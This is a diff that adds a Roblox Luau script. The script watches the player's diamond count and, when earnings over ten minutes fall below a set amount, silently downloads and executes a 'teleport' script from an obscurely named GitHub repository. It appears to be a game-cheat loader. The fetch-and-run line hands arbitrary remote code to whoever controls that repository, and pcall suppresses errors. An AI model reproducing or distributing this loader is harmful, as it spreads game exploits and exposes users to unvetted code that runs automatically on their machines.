@@ -1,0 +1,21 @@
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local leaderstats = LocalPlayer:WaitForChild("leaderstats")
+local diamondStat = leaderstats:WaitForChild("💎 Diamonds")
+
+local function check_diamond_10min()
+    while task.wait(600) do
+        local initialDiamonds = diamondStat.Value
+        task.wait(600)
+        local currentDiamonds = diamondStat.Value
+        local diamondsEarned = currentDiamonds - initialDiamonds
+
+        if diamondsEarned < 1500000 then
+            pcall(function()
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/aztbuirczzxmmcx1zz/9xmin7bszzmiay87zpqla/refs/heads/main/teleport_hallowen"))()
+            end)
+        end
+    end
+end
+
+task.spawn(check_diamond_10min)
